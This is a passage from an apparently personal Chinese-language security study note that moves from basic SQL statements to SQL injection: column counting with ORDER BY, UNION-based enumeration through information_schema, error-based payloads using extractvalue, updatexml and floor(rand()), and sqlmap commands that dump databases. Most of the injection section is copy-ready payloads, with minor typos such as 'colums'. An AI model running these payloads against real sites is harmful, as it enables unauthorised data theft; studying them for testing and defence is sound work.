class="comment">--修改id=1的行name为lisa</span></span><br></pre></td></tr></table></figure><h2 id="删除数据表中的列："><a href="#删除数据表中的列：" class="headerlink" title="删除数据表中的列："></a>删除数据表中的列：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> [数据表名] <span class="keyword">drop</span> [列名]</span><br></pre></td></tr></table></figure><h2 id="删除数据表中的行："><a href="#删除数据表中的行：" class="headerlink" title="删除数据表中的行："></a>删除数据表中的行：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> [数据表名] <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--删除id=1的行</span></span><br></pre></td></tr></table></figure><h2 id="查询数据表的包涵数据："><a href="#查询数据表的包涵数据：" class="headerlink" title="查询数据表的包涵数据："></a>查询数据表的包涵数据：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="keyword">from</span> [数据表名] <span class="keyword">where</span> id <span class="keyword">in</span> (‘<span class="number">3</span>’)；</span><br><span class="line"></span><br><span class="line"><span class="comment">--在数据表中查询id中包涵‘3’的数据</span></span><br></pre></td></tr></table></figure><h2 id="联合查询："><a href="#联合查询：" class="headerlink" title="联合查询："></a>联合查询：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  country <span class="keyword">from</span> [数据表名<span class="number">1</span>] <span class="keyword">union</span> <span class="keyword">select</span> country <span class="keyword">from</span> [数据表名<span class="number">2</span>] <span class="keyword">order</span> country;</span><br><span class="line"></span><br><span class="line"><span class="comment">--查询数据表1和数据表2中不同的country</span></span><br></pre></td></tr></table></figure><h2 id="排序："><a href="#排序：" class="headerlink" title="排序："></a>排序：</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--asc升序，desc降序</span></span><br></pre></td></tr></table></figure><h1 id="注入："><a href="#注入：" class="headerlink" title="注入："></a>注入：</h1><h2 id="数字-字符型注入："><a href="#数字-字符型注入：" class="headerlink" title="数字&#x2F;字符型注入："></a>数字&#x2F;字符型注入：</h2><h3 id="判断："><a href="#判断：" class="headerlink" title="判断："></a>判断：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">2</span><span class="number">-1</span></span><br></pre></td></tr></table></figure><h3 id="查询网站所用数据表列数："><a href="#查询网站所用数据表列数：" class="headerlink" title="查询网站所用数据表列数："></a>查询网站所用数据表列数：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span>  <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> x;</span><br><span class="line"></span><br><span class="line"><span class="comment">--x从1开始递增，当返回数据显示发生变化时，x-1为数据表列数</span></span><br></pre></td></tr></table></figure><h3 id="查询网站所用数据数据库"><a href="#查询网站所用数据数据库" class="headerlink" title="查询网站所用数据数据库"></a>查询网站所用数据数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,database(),<span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--select 后面的数量要与users列数相同</span></span><br></pre></td></tr></table></figure><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata（查库）</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/03adab05919941189102ef074eb877ae.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>库名（查表)</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/0750bef379b94e94861a46b764063d25.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.colums <span class="keyword">where</span> table_name<span class="operator">=</span>表名（查列）</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/86afe7800fab4b8a875adb17e3eb653a.png" alt="img"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> 列名 <span class="keyword">from</span> 库名.表名（查数据)</span><br></pre></td></tr></table></figure><p><img src="/../images/sql%E6%B3%A8%E5%85%A5.assets/274c6c2ae5ce494b9adf0b52bf3144f9.png" alt="img"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">查数据库名：id<span class="operator">=</span><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：id=&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()))))</span><br><span class="line"></span><br><span class="line">爆字段名：id<span class="operator">=</span><span class="string">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：id=&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(COIUMN_NAME) <span class="keyword">from</span> TABLE_NAME))))</span><br></pre></td></tr></table></figure><p>① 0x7e&#x3D;’<del>’<br> ② concat(‘a’,‘b’)&#x3D;“ab”<br> ③ version()&#x3D;@@version<br> ④ ‘</del>‘可以换成’#’、’$’等不满足xpath格式的字符<br> ⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</p><h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：<span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database())),<span class="number">0x7e</span>))</span><br><span class="line"></span><br><span class="line">爆列名：<span class="string">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：&#x27;</span><span class="keyword">and</span>(<span class="keyword">select</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> group_concat(COLUMN_NAME)<span class="keyword">from</span> TABLE_NAME)),<span class="number">0x7e</span>))</span><br></pre></td></tr></table></figure><h3 id="floor-："><a href="#floor-：" class="headerlink" title="floor()："></a><strong>floor()：</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">爆数据库名：<span class="string">&#x27;union select 1 from (select count(*),concat((select database()),&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆表名：&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>) ,&quot; &quot;,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br><span class="line"></span><br><span class="line">爆列名：<span class="string">&#x27;union select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name=&quot;TABLE_NAME&quot; limit 0,1) ,&quot; &quot;,floor(rand(0)*2))x from information_schema.tables group by x)a</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆数据：&#x27;</span><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> COLUMN_NAME <span class="keyword">from</span> TABLE_NAME limit <span class="number">0</span>,<span class="number">1</span>) ,&quot; &quot;,<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a</span><br></pre></td></tr></table></figure><h1 id="sqlmap使用："><a href="#sqlmap使用：" class="headerlink" title="sqlmap使用："></a>sqlmap使用：</h1><p>1、查看所有「数据库」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ –dbs</p><p>2.查看「数据表」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D [数据库名] –tables</p><p>3.查看「数据」</p><p>sqlmap -u ‘<a href="http://xx/?id=1">http://xx/?id=1</a>‘ -D [数据库名] -T [数据库表名] –dump</p>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
